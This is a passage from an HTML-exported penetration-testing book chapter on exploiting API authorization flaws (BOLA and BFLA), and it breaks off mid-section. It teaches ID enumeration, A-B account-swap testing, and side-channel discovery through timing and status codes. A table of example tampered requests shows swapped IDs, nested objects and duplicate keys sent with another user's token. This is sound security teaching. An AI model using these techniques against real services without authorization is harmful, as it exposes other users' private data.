<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">ol.lst-kix_28w588g8rn1a-5.start{counter-reset:lst-ctn-kix_28w588g8rn1a-5 0}.lst-kix_28w588g8rn1a-6>li{counter-increment:lst-ctn-kix_28w588g8rn1a-6}.lst-kix_ehkoowbf06u1-2>li:before{content:"\0025a0  "}.lst-kix_28w588g8rn1a-0>li:before{content:"" counter(lst-ctn-kix_28w588g8rn1a-0,decimal) ". "}.lst-kix_28w588g8rn1a-0>li{counter-increment:lst-ctn-kix_28w588g8rn1a-0}.lst-kix_ehkoowbf06u1-0>li:before{content:"\0025cf  "}.lst-kix_ehkoowbf06u1-1>li:before{content:"\0025cb  "}.lst-kix_28w588g8rn1a-1>li:before{content:"" counter(lst-ctn-kix_28w588g8rn1a-1,lower-latin) ". "}.lst-kix_ehkoowbf06u1-6>li:before{content:"\0025cf  "}ol.lst-kix_28w588g8rn1a-8.start{counter-reset:lst-ctn-kix_28w588g8rn1a-8 0}.lst-kix_ehkoowbf06u1-7>li:before{content:"\0025cb  "}.lst-kix_28w588g8rn1a-7>li{counter-increment:lst-ctn-kix_28w588g8rn1a-7}.lst-kix_ehkoowbf06u1-3>li:before{content:"\0025cf  "}.lst-kix_qw69m4fkfuu5-7>li:before{content:"\0025cb  "}.lst-kix_qw69m4fkfuu5-8>li:before{content:"\0025a0  "}.lst-kix_ehkoowbf06u1-4>li:before{content:"\0025cb  "}.lst-kix_ehkoowbf06u1-5>li:before{content:"\0025a0  "}.lst-kix_28w588g8rn1a-1>li{counter-increment:lst-ctn-kix_28w588g8rn1a-1}ul.lst-kix_qw69m4fkfuu5-3{list-style-type:none}.lst-kix_qw69m4fkfuu5-4>li:before{content:"\0025cb  "}ul.lst-kix_qw69m4fkfuu5-4{list-style-type:none}ul.lst-kix_qw69m4fkfuu5-1{list-style-type:none}.lst-kix_qw69m4fkfuu5-3>li:before{content:"\0025cf  "}ul.lst-kix_qw69m4fkfuu5-2{list-style-type:none}ul.lst-kix_ehkoowbf06u1-3{list-style-type:none}.lst-kix_qw69m4fkfuu5-2>li:before{content:"\0025a0  "}ul.lst-kix_ehkoowbf06u1-2{list-style-type:none}ul.lst-kix_qw69m4fkfuu5-0{list-style-type:none}.lst-kix_qw69m4fkfuu5-5>li:before{content:"\0025a0  "}.lst-kix_qw69m4fkfuu5-6>li:before{content:"\0025cf  "}ul.lst-kix_ehkoowbf06u1-1{list-style-type:none}ul.lst-kix_ehkoowbf06u1-0{list-style-type:none}ul.lst-kix_ehkoowbf06u1-7{list-style-type:none}ul.lst-kix_ehkoowbf06u1-6{list-style-type:none}ul.lst-kix_ehkoowbf06u1-5{list-style-type:none}ul.lst-kix_ehkoowbf06u1-4{list-style-type:none}.lst-kix_28w588g8rn1a-8>li:before{content:"" counter(lst-ctn-kix_28w588g8rn1a-8,lower-roman) ". "}.lst-kix_ehkoowbf06u1-8>li:before{content:"\0025a0  "}ul.lst-kix_qw69m4fkfuu5-7{list-style-type:none}ul.lst-kix_qw69m4fkfuu5-8{list-style-type:none}ul.lst-kix_qw69m4fkfuu5-5{list-style-type:none}ul.lst-kix_ehkoowbf06u1-8{list-style-type:none}ul.lst-kix_qw69m4fkfuu5-6{list-style-type:none}ol.lst-kix_28w588g8rn1a-8{list-style-type:none}ol.lst-kix_28w588g8rn1a-7{list-style-type:none}.lst-kix_28w588g8rn1a-2>li:before{content:"" counter(lst-ctn-kix_28w588g8rn1a-2,lower-roman) ". "}.lst-kix_28w588g8rn1a-4>li:before{content:"" counter(lst-ctn-kix_28w588g8rn1a-4,lower-latin) ". "}ol.lst-kix_28w588g8rn1a-6{list-style-type:none}ol.lst-kix_28w588g8rn1a-1.start{counter-reset:lst-ctn-kix_28w588g8rn1a-1 0}ol.lst-kix_28w588g8rn1a-7.start{counter-reset:lst-ctn-kix_28w588g8rn1a-7 0}.lst-kix_28w588g8rn1a-3>li:before{content:"" counter(lst-ctn-kix_28w588g8rn1a-3,decimal) ". "}.lst-kix_28w588g8rn1a-7>li:before{content:"" counter(lst-ctn-kix_28w588g8rn1a-7,lower-latin) ". "}.lst-kix_qw69m4fkfuu5-0>li:before{content:"\0025cf  "}.lst-kix_qw69m4fkfuu5-1>li:before{content:"\0025cb  "}.lst-kix_28w588g8rn1a-6>li:before{content:"" counter(lst-ctn-kix_28w588g8rn1a-6,decimal) ". "}ol.lst-kix_28w588g8rn1a-4.start{counter-reset:lst-ctn-kix_28w588g8rn1a-4 0}.lst-kix_28w588g8rn1a-5>li:before{content:"" counter(lst-ctn-kix_28w588g8rn1a-5,lower-roman) ". "}.lst-kix_28w588g8rn1a-3>li{counter-increment:lst-ctn-kix_28w588g8rn1a-3}ol.lst-kix_28w588g8rn1a-1{list-style-type:none}ol.lst-kix_28w588g8rn1a-0{list-style-type:none}ol.lst-kix_28w588g8rn1a-5{list-style-type:none}ol.lst-kix_28w588g8rn1a-4{list-style-type:none}ol.lst-kix_28w588g8rn1a-3{list-style-type:none}ol.lst-kix_28w588g8rn1a-2{list-style-type:none}ol.lst-kix_28w588g8rn1a-3.start{counter-reset:lst-ctn-kix_28w588g8rn1a-3 0}ol.lst-kix_28w588g8rn1a-0.start{counter-reset:lst-ctn-kix_28w588g8rn1a-0 0}.lst-kix_28w588g8rn1a-4>li{counter-increment:lst-ctn-kix_28w588g8rn1a-4}.lst-kix_w40x35iv99nl-0>li:before{content:"\0025cf  "}ul.lst-kix_w40x35iv99nl-8{list-style-type:none}ul.lst-kix_w40x35iv99nl-7{list-style-type:none}.lst-kix_w40x35iv99nl-1>li:before{content:"\0025cb  "}ul.lst-kix_w40x35iv99nl-2{list-style-type:none}.lst-kix_w40x35iv99nl-4>li:before{content:"\0025cb  "}.lst-kix_28w588g8rn1a-2>li{counter-increment:lst-ctn-kix_28w588g8rn1a-2}ul.lst-kix_w40x35iv99nl-1{list-style-type:none}ul.lst-kix_w40x35iv99nl-0{list-style-type:none}.lst-kix_28w588g8rn1a-8>li{counter-increment:lst-ctn-kix_28w588g8rn1a-8}.lst-kix_w40x35iv99nl-2>li:before{content:"\0025a0  "}ul.lst-kix_w40x35iv99nl-6{list-style-type:none}ul.lst-kix_w40x35iv99nl-5{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_w40x35iv99nl-3>li:before{content:"\0025cf  "}ul.lst-kix_w40x35iv99nl-4{list-style-type:none}.lst-kix_28w588g8rn1a-5>li{counter-increment:lst-ctn-kix_28w588g8rn1a-5}ol.lst-kix_28w588g8rn1a-6.start{counter-reset:lst-ctn-kix_28w588g8rn1a-6 0}ul.lst-kix_w40x35iv99nl-3{list-style-type:none}.lst-kix_w40x35iv99nl-8>li:before{content:"\0025a0  "}ol.lst-kix_28w588g8rn1a-2.start{counter-reset:lst-ctn-kix_28w588g8rn1a-2 0}.lst-kix_w40x35iv99nl-5>li:before{content:"\0025a0  "}.lst-kix_w40x35iv99nl-6>li:before{content:"\0025cf  "}.lst-kix_w40x35iv99nl-7>li:before{content:"\0025cb  "}ol{margin:0;padding:0}table td,table th{padding:0}.c3{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.75;border-left-width:0pt;border-top-style:solid;background-color:#ffffff;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c22{border-right-style:solid;padding-top:6pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.125;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c32{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c36{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.75;border-top-style:solid;margin-left:54pt;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c53{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:middle;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:225pt;border-top-color:#000000;border-bottom-style:solid}.c41{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:192pt;border-top-color:#000000;border-bottom-style:solid}.c12{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:225pt;border-top-color:#000000;border-bottom-style:solid}.c10{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:75pt;border-top-color:#000000;border-bottom-style:solid}.c23{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:middle;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:190.5pt;border-top-color:#000000;border-bottom-style:solid}.c26{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:190.5pt;border-top-color:#000000;border-bottom-style:solid}.c54{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:middle;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:192pt;border-top-color:#000000;border-bottom-style:solid}.c52{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:middle;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:75pt;border-top-color:#000000;border-bottom-style:solid}.c25{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:middle;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:193.5pt;border-top-color:#000000;border-bottom-style:solid}.c17{border-right-style:solid;padding:11pt 11pt 11pt 11pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;width:193.5pt;border-top-color:#000000;border-bottom-style:solid}.c0{background-color:#ffffff;-webkit-text-decoration-skip:none;color:#d3002d;font-weight:700;text-decoration:underline;text-decoration-skip-ink:none;font-size:9pt;font-family:"Times New Roman"}.c29{background-color:#ffffff;-webkit-text-decoration-skip:none;color:#d3002d;font-weight:400;text-decoration:underline;text-decoration-skip-ink:none;font-size:9pt;font-family:"Times New Roman"}.c4{background-color:#ffffff;color:#188038;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Courier New";font-style:normal}.c6{background-color:#eef2f6;color:#3d3b49;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Courier New";font-style:normal}.c2{background-color:#ffffff;color:#3d3b49;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Arial";font-style:normal}.c7{-webkit-text-decoration-skip:none;color:#d3002d;font-weight:400;text-decoration:underline;text-decoration-skip-ink:none;font-size:12pt;font-family:"Times New Roman";font-style:italic}.c30{padding-top:18pt;padding-bottom:18pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c27{padding-top:24pt;padding-bottom:24pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c18{padding-top:24pt;padding-bottom:42pt;line-height:1.75;orphans:2;widows:2;text-align:left}.c19{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c47{background-color:#eef2f6;font-size:12pt;font-family:"Courier New";color:#3d3b49;font-weight:400}.c20{background-color:#ffffff;font-size:12pt;font-family:"Courier New";color:#188038;font-weight:400}.c9{background-color:#eef2f6;font-size:12pt;font-family:"Courier New";color:#3d3b49;font-weight:700}.c51{background-color:#000000;color:#ffffff;font-weight:700;font-size:23.5pt;font-family:"Times New Roman"}.c5{background-color:#eef2f6;font-size:12pt;font-family:"Courier New";color:#188038;font-weight:400}.c21{font-size:12pt;font-family:"Times New Roman";color:#3d3b49;font-weight:700}.c39{color:#3d3b49;font-weight:700;font-size:54pt;font-family:"Times New Roman"}.c44{color:#3d3b49;font-weight:700;font-size:40.5pt;font-family:"Times New Roman"}.c37{color:#3d3b49;font-weight:700;font-size:14.5pt;font-family:"Times New Roman"}.c34{color:#3d3b49;font-weight:400;font-size:9pt;font-family:"Times New Roman"}.c55{color:#000000;font-weight:400;font-size:11pt;font-family:"Arial"}.c1{font-size:12pt;font-family:"Times New Roman";color:#3d3b49;font-weight:400}.c35{color:#3d3b49;font-weight:700;font-size:23.5pt;font-family:"Times New Roman"}.c31{border-spacing:0;border-collapse:collapse;margin-right:auto}.c28{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c13{text-decoration:none;vertical-align:baseline;font-style:normal}.c40{font-size:12pt;color:#3d3b49;font-weight:700}.c38{padding:0;margin:0}.c14{color:inherit;text-decoration:inherit}.c15{text-decoration:none;vertical-align:baseline}.c46{height:112.5pt}.c24{height:11pt}.c49{height:75pt}.c43{height:39pt}.c16{text-indent:12pt}.c11{font-style:italic}.c8{height:115.5pt}.c45{height:76.5pt}.c50{height:79.5pt}.c33{background-color:#ffffff}.c42{height:42pt}.c48{height:133.5pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c28 doc-content"><h1 class="c32" id="h.lr7dday47opg"><span class="c13 c33 c39">10</span></h1><h1 class="c32" id="h.lr7dday47opg-1"><span class="c44 c13 c33">EXPLOITING AUTHORIZATION</span></h1><p class="c27"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 610.67px; height: 800.00px;"><img alt="" src="images/image5.png" style="width: 610.67px; height: 800.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span class="c1 c13">In this chapter, we will cover two authorization vulnerabilities: BOLA and BFLA. These vulnerabilities reveal weaknesses in the authorization checks that ensure authenticated users are only able to access their own resources or use functionality that aligns with their permission level. In the process, we&rsquo;ll discuss how to identify resource IDs, use A-B and A-B-A testing, and speed up your testing with Postman and Burp Suite.</span></p><h2 class="c32 c33" id="h.3r8mysv9kks9"><span class="c35 c13">Finding BOLAs</span></h2><p class="c3"><span class="c1">BOLA continues to be one of the most prominent API-related vulnerabilities, but it can also be one of the easiest to test for. If you see that the API lists resources following a certain pattern, you can test other instances using that pattern. For instance, say you notice that after making a purchase, the app uses an API to provide you with a receipt at the following location: </span><span class="c1 c11">/api/v1/receipt/135</span><span class="c1">. Knowing this, you could then check for other numbers by using 135 as the payload position in Burp Suite or Wfuzz and changing 135 to numbers between 0 and 200. This was exactly what we did in the Chapter 4 lab when testing </span><span class="c1 c11">reqres.in</span><span class="c1 c13">&nbsp;for the total number of user accounts.</span></p><p class="c3 c16"><span class="c1 c13">This section will cover additional considerations and techniques pertinent to hunting for BOLA. When you&rsquo;re on the hunt for BOLA vulnerabilities, remember that they aren&rsquo;t only found using GET requests. Attempt to use all possible methods to interact with resources you shouldn&rsquo;t be authorized to access. Likewise, vulnerable resource IDs aren&rsquo;t limited to the URL path. Make sure to consider other possible locations to check for BOLA weaknesses, including the body of the request and headers.</span></p><h3 class="c32 c33" id="h.k2clod1zalhz"><span class="c37 c13">Locating Resource IDs</span></h3><p class="c3"><span class="c1 c13">So far, this book has illustrated BOLA vulnerabilities using examples like performing sequential requests for resources:</span></p><ol class="c38 lst-kix_28w588g8rn1a-0 start" start="1"><li class="c36 c33 li-bullet-0"><span class="c5 c13">GET /api/v1/user/account/1111</span></li><li class="c36 c33 li-bullet-0"><span class="c5 c13">GET /api/v1/user/account/1112</span></li></ol><p class="c3 c16"><span class="c1 c13">To test for this vulnerability, you could simply brute-force all account numbers within a certain range and check whether requests result in a successful response.</span></p><p class="c3 c16"><span class="c1 c13">Sometimes, finding instances of BOLA will actually be this straightforward. However, to perform thorough BOLA testing, you&rsquo;ll need to pay close attention to the information the API provider is using to retrieve resources, as it may not be so obvious. Look for user ID names or numbers, resource ID names or numbers, organization ID names or numbers, emails, phone numbers, addresses, tokens, or encoded payloads used in requests to retrieve resources.</span></p><p class="c3 c16"><span class="c1 c13">Keep in mind that predictable request values don&rsquo;t make an API vulnerable to BOLA; the API is considered vulnerable only when it provides an unauthorized user access to the requested resources. Often, insecure APIs will make the mistake of validating that the user is authenticated but fail to check whether that user is authorized to access the requested resources.</span></p><p class="c3 c16"><span class="c1">As you can see in </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23table10-1&amp;sa=D&amp;source=editors&amp;ust=1681144486685133&amp;usg=AOvVaw1KvCwYLtsI0D5YguuuqIVu">Table 10-1</a></span><span class="c1 c13">, there are plenty of ways you can attempt to obtain resources you shouldn&rsquo;t be authorized to access. These examples are based on actual successful BOLA findings. In each of these requests, the requester used the same UserA token.</span></p><p class="c22"><span class="c0">Table 10-1</span><span class="c34 c15 c11 c33">: Valid Requests for Resources and the Equivalent BOLA Test</span></p><a id="t.7beb122c1e8c707fb48a02cd87437affdb867a7a"></a><a id="t.0"></a><table class="c31"><tr class="c42"><td class="c52" colspan="1" rowspan="1"><p class="c18"><span class="c40 c33">Type</span></p></td><td class="c23" colspan="1" rowspan="1"><p class="c18"><span class="c40 c33">Valid request</span></p></td><td class="c25" colspan="1" rowspan="1"><p class="c18"><span class="c40 c33">BOLA test</span></p></td></tr><tr class="c45"><td class="c10" colspan="1" rowspan="1"><p class="c18"><span class="c1 c33">Predictable ID</span></p></td><td class="c26" colspan="1" rowspan="1"><p class="c18"><span class="c5 c13">GET /api/v1/account/2222</span></p><p class="c18"><span class="c5">Token: UserA_token</span></p></td><td class="c17" colspan="1" rowspan="1"><p class="c18"><span class="c5 c13">GET /api/v1/account/3333</span></p><p class="c18"><span class="c5">Token: UserA_token</span></p></td></tr><tr class="c50"><td class="c10" colspan="1" rowspan="1"><p class="c18"><span class="c1 c33">ID combo</span></p></td><td class="c26" colspan="1" rowspan="1"><p class="c18"><span class="c20">GET /api/v1/UserA/data</span><span class="c1 c33">/</span><span class="c4">2222</span></p><p class="c18"><span class="c20">Token: UserA_token</span></p></td><td class="c17" colspan="1" rowspan="1"><p class="c18"><span class="c4">GET /api/v1/UserB/data/3333</span></p><p class="c18"><span class="c20">Token: UserA_token</span></p></td></tr><tr class="c50"><td class="c10" colspan="1" rowspan="1"><p class="c18"><span class="c1 c33">Integer as ID</span></p></td><td class="c26" colspan="1" rowspan="1"><p class="c18"><span class="c5 c13">POST /api/v1/account/</span></p><p class="c18"><span class="c5 c13">Token: UserA_token</span></p><p class="c18"><span class="c5">{&quot;Account&quot;:</span><span class="c1 c33">&nbsp;</span><span class="c5">2222}</span></p></td><td class="c17" colspan="1" rowspan="1"><p class="c18"><span class="c5 c13">POST /api/v1/account/</span></p><p class="c18"><span class="c5 c13">Token: UserA_token</span></p><p class="c18"><span class="c5">{&quot;Account&quot;: [3333]}</span></p></td></tr><tr class="c46"><td class="c10" colspan="1" rowspan="1"><p class="c18"><span class="c1 c33">Email as user ID</span></p></td><td class="c26" colspan="1" rowspan="1"><p class="c18"><span class="c4">POST /api/v1/user/account</span></p><p class="c18"><span class="c4">Token: UserA_token</span></p><p class="c18"><span class="c20">{&quot;email&quot;: &quot;UserA@email.com&quot;}</span></p></td><td class="c17" colspan="1" rowspan="1"><p class="c18"><span class="c4">POST /api/v1/user/account</span></p><p class="c18"><span class="c4">Token: UserA_token</span></p><p class="c18"><span class="c20">{&quot;email&quot;: &quot;UserB@email.com&quot;}</span></p></td></tr><tr class="c45"><td class="c10" colspan="1" rowspan="1"><p class="c18"><span class="c1 c33">Group ID</span></p></td><td class="c26" colspan="1" rowspan="1"><p class="c18"><span class="c5 c13">GET /api/v1/group/CompanyA</span></p><p class="c18"><span class="c5">Token: UserA_token</span></p></td><td class="c17" colspan="1" rowspan="1"><p class="c18"><span class="c5 c13">GET /api/v1/group/CompanyB</span></p><p class="c18"><span class="c5">Token: UserA_token</span></p></td></tr><tr class="c46"><td class="c10" colspan="1" rowspan="1"><p class="c18"><span class="c1 c33">Group and user combo</span></p></td><td class="c26" colspan="1" rowspan="1"><p class="c18"><span class="c4">POST /api/v1/group/CompanyA</span></p><p class="c18"><span class="c4">Token: UserA_token</span></p><p class="c18"><span class="c20">{&quot;email&quot;: &quot;userA@CompanyA.com&quot;}</span></p></td><td class="c17" colspan="1" rowspan="1"><p class="c18"><span class="c4">POST /api/v1/group/CompanyB</span></p><p class="c18"><span class="c4">Token: UserA_token</span></p><p class="c18"><span class="c20">{&quot;email&quot;: &quot;userB@CompanyB.com&quot;}</span></p></td></tr><tr class="c8"><td class="c10" colspan="1" rowspan="1"><p class="c18"><span class="c1 c33">Nested object</span></p></td><td class="c26" colspan="1" rowspan="1"><p class="c18"><span class="c5 c13">POST /api/v1/user/checking</span></p><p class="c18"><span class="c5 c13">Token: UserA_token</span></p><p class="c18"><span class="c5">{&quot;Account&quot;:</span><span class="c1 c33">&nbsp;</span><span class="c5">2222}</span></p></td><td class="c17" colspan="1" rowspan="1"><p class="c18"><span class="c5 c13">POST /api/v1/user/checking</span></p><p class="c18"><span class="c5 c13">Token: UserA_token</span></p><p class="c18"><span class="c5">{&quot;Account&quot;:</span><span class="c21 c33">&nbsp;</span><span class="c5">{&quot;Account&quot; :3333}}</span></p></td></tr><tr class="c48"><td class="c10" colspan="1" rowspan="1"><p class="c18"><span class="c1 c33">Multiple objects</span></p></td><td class="c26" colspan="1" rowspan="1"><p class="c18"><span class="c4">POST /api/v1/user/checking</span></p><p class="c18"><span class="c4">Token: UserA_token</span></p><p class="c18"><span class="c20">{&quot;Account&quot;:</span><span class="c1 c33">&nbsp;</span><span class="c20">2222}</span></p></td><td class="c17" colspan="1" rowspan="1"><p class="c18"><span class="c4">POST /api/v1/user/checking</span></p><p class="c18"><span class="c4">Token: UserA_token</span></p><p class="c18"><span class="c20">{&quot;Account&quot;:</span><span class="c1 c33">&nbsp;</span><span class="c20">2222, &quot;Account&quot;: 3333, &quot;Account&quot;: 5555}</span></p></td></tr><tr class="c46"><td class="c10" colspan="1" rowspan="1"><p class="c18"><span class="c1 c33">Predictable token</span></p></td><td class="c26" colspan="1" rowspan="1"><p class="c18"><span class="c5 c13">POST /api/v1/user/account</span></p><p class="c18"><span class="c5 c13">Token: UserA_token</span></p><p class="c18"><span class="c5">{&quot;data&quot;: &quot;DflK1df7jSdfa1acaa&quot;}</span></p></td><td class="c17" colspan="1" rowspan="1"><p class="c18"><span class="c5 c13">POST /api/v1/user/account</span></p><p class="c18"><span class="c5 c13">Token: UserA_token</span></p><p class="c18"><span class="c5">{&quot;data&quot;: &quot;DflK1df7jSdfa</span><span class="c21 c33">2df</span><span class="c5">aa&quot;}</span></p></td></tr></table><p class="c3 c16"><span class="c1">Sometimes, just requesting the resource won&rsquo;t be enough; instead, you&rsquo;ll need to request the resource as it was meant to be requested, often by supplying both the resource ID and the user&rsquo;s ID. Thus, due to the nature of how APIs are organized, a proper request for resources may require the </span><span class="c1 c11">ID</span><span class="c1">&nbsp;</span><span class="c1 c11">combo </span><span class="c1">format shown in </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23table10-1&amp;sa=D&amp;source=editors&amp;ust=1681144486701250&amp;usg=AOvVaw1e5zsM00lwCa_g9icqlGEa">Table 10-1</a></span><span class="c1">. Similarly, you may need to know the group ID along with the resource ID, as in the </span><span class="c1 c11">group and user combo</span><span class="c1 c13">&nbsp;format.</span></p><p class="c3 c16"><span class="c1 c11">Nested objects</span><span class="c1 c13">&nbsp;are a typical structure found in JSON data. These are simply additional objects created within an object. Since nested objects are a valid JSON format, the request will be processed if user input validation does not prevent it. Using a nested object, you could escape or bypass security measures applied to the outer key/value pair by including a separate key/value pair within the nested object that may not have the same security controls applied to it. If the application processes these nested objects, they are an excellent vector for an authorization weakness.</span></p><h3 class="c32 c33" id="h.xalriajl8ryh"><span class="c13 c37">A-B Testing for BOLA</span></h3><p class="c3"><span class="c1">What we call </span><span class="c1 c11">A-B testing</span><span class="c1 c13">&nbsp;is the process of creating resources using one account and attempting to retrieve those resources as a different account. This is one of the best ways to identify how resources are identified and what requests are used to obtain them. The A-B testing process looks like this:</span></p><ul class="c38 lst-kix_ehkoowbf06u1-0 start"><li class="c36 c33 li-bullet-0"><span class="c21">Create resources as UserA.</span><span class="c1 c13">&nbsp;Note how the resources are identified and how the resources are requested.</span></li><li class="c33 c36 li-bullet-0"><span class="c21">Swap out your UserA token for another user&rsquo;s token.</span><span class="c1 c13">&nbsp;In many instances, if there is an account registration process, you will be able to create a second account (UserB).</span></li><li class="c36 c33 li-bullet-0"><span class="c21">Using UserB&rsquo;s token, make the request for UserA&rsquo;s resources.</span><span class="c1 c13">&nbsp;Focus on resources for private information. Test for any resources that UserB should not have access to, such as full name, email, phone number, Social Security number, bank account information, legal information, and transaction data.</span></li></ul><p class="c3 c16"><span class="c1 c13">The scale of this testing is small, but if you can access one user&rsquo;s resources, you could likely access all user resources of the same privilege level.</span></p><p class="c3 c16"><span class="c1 c13">A variation on A-B testing is to create three accounts for testing. That way, you can create resources in each of the three different accounts, detect any patterns in the resource identifiers, and check which requests are used to request those resources, as follows:</span></p><ul class="c38 lst-kix_qw69m4fkfuu5-0 start"><li class="c36 c33 li-bullet-0"><span class="c21">Create multiple accounts at each privilege level to which you have access.</span><span class="c1 c13">&nbsp;Keep in mind that your goal is to test and validate security controls, not destroy someone&rsquo;s business. When performing BFLA attacks, there is a chance you could successfully delete the resources of other users, so it helps to limit a dangerous attack like this to a test account you create.</span></li><li class="c36 c33 li-bullet-0"><span class="c21">Using your accounts, create a resource with UserA&rsquo;s account and attempt to interact with it using UserB&rsquo;s.</span><span class="c1 c13">&nbsp;Use all the methods at your disposal.</span></li></ul><h3 class="c32 c33" id="h.128kttslizr0"><span class="c37 c13">Side-Channel BOLA</span></h3><p class="c3"><span class="c1">One of my favorite methods of obtaining sensitive information from an API is through side-channel disclosure. Essentially, this is any information gleaned from unexpected sources, such as timing data. In past chapters, we discussed how APIs can reveal the existence of resources through middleware like </span><span class="c5">X-Response-Time</span><span class="c1 c13">. Side-channel discoveries are another reason why it is important to use an API as it was intended and develop a baseline of normal responses.</span></p><p class="c3 c16"><span class="c1 c13">In addition to timing, you could use response codes and lengths to determine if resources exist. For example, if an API responds to nonexistent resources with a 404 Not Found but has a different response for existing resources, such as 405 Unauthorized, you&rsquo;ll be able to perform a BOLA side-channel attack to discover existing resources such as usernames, account IDs, and phone numbers.</span></p><p class="c3 c16"><span class="c7"><a class="c14" 